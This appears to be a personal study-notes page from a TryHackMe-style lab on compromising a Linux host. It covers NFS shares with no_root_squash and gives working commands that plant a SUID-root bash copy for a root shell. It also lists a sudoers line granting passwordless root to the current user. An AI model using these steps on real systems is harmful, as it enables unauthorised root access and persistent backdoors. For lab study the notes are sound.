# Compromise a Linux host

<hr class="sep-both">

## Network File System (NFS)

[![kenobi](../../_badges/thm-p/kenobi.svg)](https://tryhackme.com/room/kenobi)

<div class="row row-cols-md-2"><div>

To avoid copying and pasting information too much, you will have to read these pages for more information.

* [NFS protocol](/_it/networking/protocols/index.md#-nfs---2049-tcp)
* [NFS notes](/_cybersecurity/exploitation/services/index.md#nfs---2049-tcp)

To summarize, locally, you can use this command to find NFS shares.

```bash
# see NFS exports
$ cat /etc/exports
```
</div><div>

You will find an exploitable NFS misconfiguration when the option `no_root_squash` is set for a share. Root squashing map any local user to the user "nobody". If disabled, then the root user on the local machine will have root privilege inside the share.

```bash
# on the remote host, we create a bash inside the share
$ cp /bin/bash /share/sbash
# on the local host
# we give the file root privileges
$ sudo chown root /tmp/share/sbash
$ sudo chmod +s /tmp/share/sbash
# Then on the host, running the SUID file
# will run it as root
$ /share/sbash -p
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-md-2"><div>

Courses

* [payatu.com](https://payatu.com/guide-linux-privilege-escalation)
* [udemy.com](https://www.udemy.com/course/linux-privilege-escalation/)
* `$(whoami)  ALL=(ALL) NOPASSWD:ALL`
</div><div>
</div></div>